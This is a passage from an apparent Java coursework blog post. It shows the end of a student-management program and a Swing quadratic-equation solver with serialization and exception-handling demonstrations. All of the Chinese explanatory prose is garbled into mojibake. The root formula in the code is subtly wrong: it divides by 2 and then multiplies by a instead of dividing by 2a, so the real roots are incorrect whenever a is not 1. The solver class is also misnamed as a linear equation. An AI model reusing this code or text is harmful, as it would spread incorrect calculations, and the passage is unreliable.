class="line"></span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;âš  The student&#x27;s information you want to modify does not exist&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised name:&quot;</span>);</span><br><span class="line">        String name = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised age:&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised address:&quot;</span>);</span><br><span class="line">        String address = sc.next();</span><br><span class="line"></span><br><span class="line">        Student s = <span class="keyword">new</span> Student(stuid, name, age, address);</span><br><span class="line">        stuCollection.set(i, s);</span><br><span class="line">        System.out.println(<span class="string">&quot;âœ…ï¸Modified successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p>1.é¦–å…ˆæŸ¥çœ‹å­¦ç”Ÿï¼ˆç³»ç»Ÿè‡ªå¸¦å››ä¸ªå­¦ç”Ÿ)ã€‚ç„¶åæ·»åŠ å­¦ç”ŸMaxã€‚</p><p><img src="/img/eb01f612b479d47dda3e7e5206e90cf1.jpeg"></p><p>2. å†æ¬¡æŸ¥çœ‹å­¦ç”Ÿï¼ŒMaxå·²è¢«æ·»åŠ ã€‚</p><p><img src="/img/6e1646362410d2732508e1b02a50149b.jpeg"></p><p>3.è¾“å…¥Eï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ä¿®æ”¹å­¦ç”Ÿã€‚æ­¤æ—¶å°†ä¼šè‡ªåŠ¨æ˜¾ç¤ºæ‰€æœ‰å­¦ç”Ÿã€‚å¦‚æœè¾“å…¥é”™è¯¯çš„å­¦å·å°†ä¼šæŠ¥é”™ã€‚</p><p><img src="/img/87564068d6bd9302a7080dd99f3b3828.jpeg"></p><p>ä¿®æ”¹å­¦å·ä¸º08190001çš„å­¦ç”Ÿï¼ˆAlexï¼‰çš„ä¿¡æ¯ã€‚ä¹‹åæŸ¥çœ‹æ‰€æœ‰å­¦ç”Ÿä¿¡æ¯ï¼ŒAlexçš„ä¿¡æ¯å·²è¢«ä¿®æ”¹ã€‚</p><p><img src="/img/3560809e5ff63a802aab3c29bcc7345c.jpeg"></p><p>4.åˆ é™¤å­¦ç”Ÿã€‚åŒæ ·çš„ï¼Œå¦‚æœè¾“å…¥é”™è¯¯çš„å­¦å·å°†ä¼šæŠ¥é”™ã€‚ç°åœ¨åˆ é™¤Edwardçš„ä¿¡æ¯ï¼Œåˆ é™¤å®ŒæˆåæŸ¥çœ‹æ‰€æœ‰å­¦ç”Ÿä¿¡æ¯ï¼ŒEdwardå·²è¢«åˆ é™¤ã€‚</p><p><img src="/img/4ff43adc7e9f12469d105d39eaaf67a6.jpeg"></p><p>5. æŸ¥æ‰¾å­¦ç”Ÿã€‚å¦‚æœè¾“å…¥é”™è¯¯çš„åŠŸèƒ½ä»£å·ï¼ˆFunction Codeï¼‰å°†ä¼šæŠ¥é”™ã€‚æŸ¥æ‰¾å­¦å·ä¸º08199900çš„å­¦ç”Ÿï¼Œå¦‚æœæ‰¾åˆ°åˆ™è¿”å›ä¿¡æ¯ã€‚è¾“å…¥Qé€€å‡ºç³»ç»Ÿã€‚</p><p><img src="/img/fd9ce3de0c696ad78e3b3f0a37a78271.jpeg"></p><h3 id="è®¾è®¡ä¸€ä¸ªæ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹çš„ç¨‹åº"><a href="#è®¾è®¡ä¸€ä¸ªæ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹çš„ç¨‹åº" class="headerlink" title="è®¾è®¡ä¸€ä¸ªæ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹çš„ç¨‹åº"></a>è®¾è®¡ä¸€ä¸ªæ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹çš„ç¨‹åº</h3><p>ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryLinearEquation</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String show;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> b;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> c;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> x1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> x2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> real;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> complex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isComplex = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BinaryLinearEquation</span><span class="params">(<span class="keyword">double</span> A, <span class="keyword">double</span> B, <span class="keyword">double</span> C)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = A;</span><br><span class="line">        <span class="keyword">this</span>.b = B;</span><br><span class="line">        <span class="keyword">this</span>.c = C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">this</span>.isComplex)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The equation is\n&quot;</span> + <span class="keyword">this</span>.a + <span class="string">&quot;x^2 + &quot;</span> + <span class="keyword">this</span>.b + <span class="string">&quot;x + &quot;</span> + <span class="keyword">this</span>.c +</span><br><span class="line">                <span class="string">&quot;\nThe solution of this equation is:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.x1 + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.x2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The equation is\n&quot;</span> + <span class="keyword">this</span>.a + <span class="string">&quot;x^2 + &quot;</span> + <span class="keyword">this</span>.b + <span class="string">&quot;x + &quot;</span> + <span class="keyword">this</span>.c +</span><br><span class="line">                    <span class="string">&quot;\nThe solution of this equation is:\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Solve</span><span class="params">()</span> <span class="keyword">throws</span> NonQuadraticEquationException </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> delta = <span class="keyword">this</span>.b * <span class="keyword">this</span>.b - <span class="number">4</span> * <span class="keyword">this</span>.a * <span class="keyword">this</span>.c;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.a == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NonQuadraticEquationException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (delta &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.isComplex = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.real = ((-<span class="number">1</span>) * b) / (<span class="number">2</span> * a);</span><br><span class="line">                <span class="keyword">this</span>.complex = Math.sqrt(-<span class="number">1</span> * delta) / (<span class="number">2</span> * a);</span><br><span class="line">                show = <span class="string">&quot;The equation has a pair of conjugate complex roots.\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.real = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">this</span>.complex = Math.sqrt(-<span class="number">1</span> * delta) / (<span class="number">2</span> * a);</span><br><span class="line">                show = <span class="string">&quot;The equation has a pair of opposite virtual roots.\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x1 = 0 - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x2 = 0 + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.x1 = ((-<span class="keyword">this</span>.b) + Math.sqrt(delta)) / <span class="number">2</span> * <span class="keyword">this</span>.a;</span><br><span class="line">            <span class="keyword">if</span> (delta == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.x2 = <span class="keyword">this</span>.x1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.x2 = ((-<span class="keyword">this</span>.b) - Math.sqrt(delta)) / <span class="number">2</span> * <span class="keyword">this</span>.a;</span><br><span class="line">            show = <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.x1 + <span class="string">&quot;\nx2 = &quot;</span> + <span class="keyword">this</span>.x2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NonQuadraticEquationException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NonQuadraticEquationException</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;The input equation is not a binary linear equation!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CalcPanel</span> <span class="keyword">extends</span> <span class="title">Panel</span> </span>&#123;</span><br><span class="line">    JLabel label1, label2, label3;</span><br><span class="line">    JTextField text1, text2, text3;</span><br><span class="line">    JButton button1,button2,button3,button4;</span><br><span class="line"></span><br><span class="line">    CalcPanel() &#123;</span><br><span class="line">        <span class="keyword">this</span>.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>));</span><br><span class="line">        text1 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text1.setPreferredSize(text1.getSize());</span><br><span class="line">        text2 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text2.setPreferredSize(text1.getSize());</span><br><span class="line">        text3 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text3.setPreferredSize(text1.getSize());</span><br><span class="line">        Font font = <span class="keyword">new</span> Font(Font.SERIF, Font.PLAIN, <span class="number">20</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Quadratic Term Coefficient&quot;</span>);</span><br><span class="line">        label2 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Primary Term Coefficient&quot;</span>);</span><br><span class="line">        label3 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Constant Term&quot;</span>);</span><br><span class="line">        label1.setFont(font);</span><br><span class="line">        label1.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        label2.setFont(font);</span><br><span class="line">        label2.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        label3.setFont(font);</span><br><span class="line">        label3.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        button1 = <span class="keyword">new</span> JButton(<span class="string">&quot;Solve&quot;</span>);</span><br><span class="line">        button2 = <span class="keyword">new</span> JButton(<span class="string">&quot;Clear the input box&quot;</span>);</span><br><span class="line">        button3 = <span class="keyword">new</span> JButton(<span class="string">&quot;Exit&quot;</span>);</span><br><span class="line">        button4 = <span class="keyword">new</span> JButton(<span class="string">&quot;Deserialize&quot;</span>);</span><br><span class="line">        button2.setSize(<span class="number">300</span>,<span class="number">25</span>);</span><br><span class="line">        button2.addActionListener(<span class="keyword">this</span>::actionPerformedClear);</span><br><span class="line">        button3.addActionListener(<span class="keyword">this</span>::actionPerformedExit);</span><br><span class="line">        button4.addActionListener(<span class="keyword">this</span>::actionPerformedDeserialize);</span><br><span class="line"></span><br><span class="line">        add(label1);</span><br><span class="line">        add(text1);</span><br><span class="line">        add(label2);</span><br><span class="line">        add(text2);</span><br><span class="line">        add(label3);</span><br><span class="line">        add(text3);</span><br><span class="line">        add(button1);</span><br><span class="line">        add(button2);</span><br><span class="line">        add(button3);</span><br><span class="line">        add(button4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Clear</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedClear</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.text1.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.text2.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.text3.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Exit</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedExit</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = JOptionPane.showConfirmDialog(<span class="keyword">null</span>, <span class="string">&quot;Confirm to exit the interface?&quot;</span>, <span class="string">&quot;Exit&quot;</span>,JOptionPane.OK_CANCEL_OPTION,JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">        <span class="keyword">if</span> (result == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Deserialize</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedDeserialize</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis)) &#123;</span><br><span class="line">            BinaryLinearEquation ex = (BinaryLinearEquation) ois.readObject();</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,ex.getInfo(),<span class="string">&quot;Deserialized Object&quot;</span>,JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException | IOException exception)&#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,exception.getMessage(),<span class="string">&quot;IOException&quot;</span>,JOptionPane.WARNING_MESSAGE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainPanel</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">ActionListener</span> </span>&#123;</span><br><span class="line">    CalcPanel panel;</span><br><span class="line">    JTextArea textArea;</span><br><span class="line">    BinaryLinearEquation BLEquation;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainPanel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setLayout(<span class="keyword">new</span> BorderLayout());</span><br><span class="line">        panel = <span class="keyword">new</span> CalcPanel();</span><br><span class="line">        panel.button1.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        textArea = <span class="keyword">new</span> JTextArea();</span><br><span class="line">        textArea.setBounds(getX(), getY(), <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">        Font font2 = <span class="keyword">new</span> Font(<span class="string">&quot;è‹¹æ–¹&quot;</span>,Font.PLAIN,<span class="number">20</span>);</span><br><span class="line">        textArea.setFont(font2);</span><br><span class="line">        add(panel, BorderLayout.NORTH);</span><br><span class="line">        add(textArea, BorderLayout.CENTER);</span><br><span class="line">        setBounds(<span class="number">450</span>, <span class="number">300</span>, <span class="number">600</span>, <span class="number">600</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setTitle(<span class="string">&quot;Binary Linear Equation Calculator&quot;</span>);</span><br><span class="line">        validate();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Solve</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos)) &#123;</span><br><span class="line">            BLEquation = <span class="keyword">new</span> BinaryLinearEquation(Double.parseDouble(panel.text1.getText()), Double.parseDouble(panel.text2.getText()), Double.parseDouble(panel.text3.getText()));</span><br><span class="line">            BLEquation.Solve();</span><br><span class="line">            oos.writeObject(BLEquation);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">            ioException.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,ioException.getMessage(),<span class="string">&quot;IOException&quot;</span>,JOptionPane.WARNING_MESSAGE);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e1) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,e1.getMessage(),<span class="string">&quot;Input error!&quot;</span>,JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">this</span>.textArea.setText(BinaryLinearEquation.show);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NonQuadraticEquationException e2) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,e2.toString(),<span class="string">&quot;Error in the form of the quadratic equation&quot;</span>,JOptionPane.ERROR_MESSAGE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.textArea.setText(BinaryLinearEquation.show);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GUI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MainPanel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ˆå›¾å½¢åŒ–ç•Œé¢ï¼‰ï¼š</p><ol><li>ç•Œé¢å¦‚ä¸‹æ‰€ç¤ºã€‚<img src="/img/20e871123d20734d519e683ab4efe514.jpeg"></li></ol><p>2. å½“è¾“å…¥ä¸ºç©ºæ—¶æŠ¥é”™ã€‚</p><p><img src="/img/8e23ea88cd0134216e9b191aa32cca38.jpeg"></p><p>3. æ±‚è§£<br>$$<br>{x^2} + x + 1 = 0<br>$$<br>æç¤ºè¯¥æ–¹ç¨‹æœ‰ä¸€å¯¹å…±è½­å¤æ ¹ã€‚</p><p><img src="/img/923af5e7de08718f5561d00051df8ca5.jpeg"></p><p>4.æ±‚è§£<br>$$<br>{x^2} + 1 = 0<br>$$<br>ç¨‹åºæç¤ºè¯¥æ–¹ç¨‹æœ‰ä¸€å¯¹ç›¸åçš„è™šæ ¹ã€‚</p><p><img src="/img/86c0211ed62170fcaf1ab71b522a42b5.jpeg"></p><p>5. ï¼ˆ1ï¼‰ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŠŸèƒ½ã€‚é¦–å…ˆæ±‚è§£ä¸€ä¸ªæ–¹ç¨‹ï¼Œä¾‹å¦‚<br>$$<br>{x^2} + 192x + 123 = 0<br>$$<br>æ±‚è§£å¦‚ä¸‹ã€‚<img src="/img/d52531376bb42f3e0ae81fbdaa8221c4.jpeg"></p><p>ï¼ˆ2ï¼‰æ­¤æ—¶ç”Ÿæˆäº†<code>file1.data</code>æ–‡ä»¶ï¼Œä½œä¸ºåºåˆ—åŒ–åçš„å¯¹è±¡ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚æˆ‘ä»¬ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€åï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/img/9ee80191e1b841b132b3db423f55a2cf.jpeg"></p><p>ï¼ˆ3ï¼‰ç„¶åç‚¹å‡»DeserializeæŒ‰é’®ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œç¨‹åºå°†è¾“å‡ºåŸæ–¹ç¨‹å’Œæ–¹ç¨‹çš„è§£ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/img/6a08a8d426769b66a3bd387638567e45.jpeg"></p><p>ï¼ˆ4ï¼‰åŒæ ·çš„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åºåˆ—åŒ–æ–¹ç¨‹<br>$$<br>{x^2} + x + 1 = 0<br>$$<br>çš„å¯¹è±¡ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/img/f7932a4afda9a6dbc946db8a3237e4fd.jpeg"></p><p>6. ä¸‹é¢æˆ‘ä»¬æ¥æ¼”ç¤ºä¸€ä¸‹å¼‚å¸¸å¤„ç†ã€‚å¼€å§‹æ—¶å·²ç»æ¼”ç¤ºè¿‡ç©ºå­—ç¬¦å¼‚å¸¸ï¼Œè¿™é‡Œä¸å†é‡å¤ã€‚</p><p>ï¼ˆ1ï¼‰å‡å¦‚æˆ‘ä»¬åˆ é™¤<code>file1.data</code>æ–‡ä»¶ï¼Œç³»ç»Ÿå°†ä¼šæ•æ‰åˆ°<code>IOException</code>ï¼Œæ•ˆæœå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/img/49efc893627e64b5beeb1200e7ebf607.jpeg"></p><p>ï¼ˆ2ï¼‰å¦‚æœåœ¨è¾“å…¥æ¡†å†…è¾“å…¥å­—æ¯ç­‰éæ³•å­—ç¬¦ï¼Œå°†ä¼šæ•æ‰åˆ°<code>NumberFormatException</code>ï¼Œæ•ˆæœå¦‚ä¸‹ã€‚</p><p><img src="/img/58971a05e051820aef0c4dbdfb656f56.jpeg"></p><p>ï¼ˆ3ï¼‰å¦‚æœäºŒæ¬¡é¡¹ç³»æ•°è¾“å…¥ä¸º0ï¼Œåˆ™ä¼šè§¦å‘æˆ‘ä»¬è‡ªå®šä¹‰çš„å¼‚å¸¸ï¼š</p><p>**<code>NonQuadraticEquationException</code>**ï¼Œæ­¤æ—¶ä¸æ˜¯äºŒå…ƒä¸€æ¬¡æ–¹ç¨‹ï¼Œç¨‹åºæŠ¥é”™ã€‚</p><p><img src="/img/613e6d93c2f70a5774c04ef5a062a348.jpeg"></p><p>7. ç‚¹å‡»Clear the input 